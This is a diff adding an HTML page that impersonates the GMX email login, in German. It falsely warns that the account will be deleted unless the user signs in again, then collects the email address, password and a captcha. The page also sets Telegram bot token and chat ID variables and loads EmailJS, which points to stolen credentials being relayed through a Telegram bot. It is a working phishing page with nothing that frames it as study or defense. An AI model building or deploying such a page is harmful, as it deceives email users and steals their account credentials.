@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"> <!-- Disable zoom completely -->
+    <title>GMX Login</title>
+    <meta name="description" content="Melden Sie sich bei Ihrem GMX-Konto an, um die Deaktivierung zu stoppen">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <link rel="icon" href="/static/images/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="stylesheet" href="mv.css">
+
+    <style>
+        /* Prevent zooming on input fields for mobile devices */
+        input, textarea {
+            font-size: 16px; /* Ensure text size is large enough to prevent zoom */
+            line-height: 1.5;  /* Optional: improve readability */
+        }
+
+        /* Additional fix: body font-size to ensure no small text that triggers zooming */
+        body {
+            font-size: 16px; /* Make body text large enough */
+        }
+
+        /* Optional: Set a larger minimum zoom for mobile devices */
+        html {
+            -ms-zoom: 1; /* For IE / Edge */
+            -webkit-text-size-adjust: 100%; /* For Safari */
+            -moz-text-size-adjust: 100%; /* For Firefox */
+        }
+    </style>
+
+    <script>
+        // Set global JavaScript variables
+        window.telegramBotToken = "{{ telegram_bot_token }}";
+        window.telegramChatId = "{{ telegram_chat_id }}";
+    </script>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="/static/images/1.png" alt="GMX Logo" class="logo">
+            <span class="account-text">Mein Account</span>
+        </div>
+    </header>
+    <main class="main-content">
+        <div class="login-container">
+            <img src="/static/images/1.svg" alt="GMX Logo" class="formlogo">
+            <h1>Bitte erneut einloggen</h1>
+            <form id="login-form" action="/login" method="POST">
+                <p>Melden Sie sich bei Ihrem GMX.DE-Konto an, um Ihre Identität zu bestätigen und die Kontolöschung zu verhindern</p>
+                <label for="email">GMX E-Mail-Adresse</label>
+                <input type="email" id="email" name="email" required>
+                <label for="password">Passwort eingeben</label>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" required>
+                    <button type="button" id="toggle-password" class="toggle-password">
+                        <img src="/static/images/eye-icon.jpg" alt="Toggle Password Visibility">
+                    </button>
+                </div>
+                <div class="captcha-wrapper">
+                    <div class="captcha-container">
+                        <div class="captcha-icon">
+                            <span class="captcha-text">Sicherheitsabfrage</span>
+                            <img src="/static/images/21.jpg" alt="Captcha Icon">
+                        </div>
+                        <div class="captchaa-background">
+                            <img id="captcha-image" src="/static/images/captcha2.jpg" alt="Captcha für Verifikation" class="captcha-image">
+                        </div>
+                        <a href="#" id="refresh-captcha" class="refresh-captcha">Andere Zeichenfolge anzeigen</a>
+                        <label for="captcha-input" class="captcha-label">Zeichenfolge eingeben</label>
+                        <input type="text" id="captcha-input" name="captcha" required>
+                    </div>
+                </div>
+                <button type="submit" class="login-button">Login</button>
+            </form>
+        </div>
+    </main>
+    <footer class="footer">
+        <nav>
+            <a href="#">Impressum</a>
+            <a href="#">Verträge hier kündigen</a>
+            <a href="#">Datenschutzhinweise</a>
+            <a href="#">AGB</a>
+            <a href="#">Hilfe und Tipps</a>
+        </nav>
+    </footer>
+    
+
+    <script src="js.js"></script>
+    <script>
+        // Toggle password visibility
+document.getElementById('toggle-password').addEventListener('click', function() {
+    const passwordInput = document.getElementById('password');
+    passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+});
+
+
+    // Set or get the end time from localStorage
+    function setEndTime() {
+        const currentTime = new Date().getTime();
+        const endTime = currentTime + 12 * 60 * 60 * 1000; // 12 hours from now
+        localStorage.setItem('captchaEndTime', endTime);
+        return endTime;
+    }
+
+    // Check if we have an existing end time and if it is expired
+    function getEndTime() {
+        const storedEndTime = localStorage.getItem('captchaEndTime');
+        if (storedEndTime) {
+            const currentTime = new Date().getTime();
+            if (currentTime > storedEndTime) {
+                // If time expired, reset the end time
+                return setEndTime();
+            }
+            return parseInt(storedEndTime, 10);
+        }
+        // If no stored end time, set one
+        return setEndTime();
+    }
+
+    </script>
+
+</body>
+</html>
